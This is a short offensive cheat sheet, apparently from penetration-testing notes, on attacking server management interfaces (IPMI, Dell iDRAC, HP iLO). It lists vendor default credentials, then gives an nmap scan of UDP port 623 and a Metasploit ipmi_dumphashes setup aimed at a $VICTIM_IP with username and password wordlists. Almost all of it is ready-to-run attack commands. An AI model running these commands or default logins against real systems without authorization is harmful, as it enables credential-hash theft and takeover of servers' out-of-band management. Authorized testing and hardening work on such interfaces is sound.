

#### <span style="color:#FFB86C">Default creds</span>
- Dell iDRAC: `root / calvin`
- HP iLO: `Administrator / random password`
- Supermicro IPMI: `ADMIN / ADMIN`

```bash
# scan with nmap script
sudo nmap -sU --script ipmi-version -p 623 $VICTIM_IP

# Metasploit Dumping Hashes
use auxiliary/scanner/ipmi/ipmi_dumphashes 
set rhosts $VICTIM_IP
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt
set USER_FILE /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt

run

```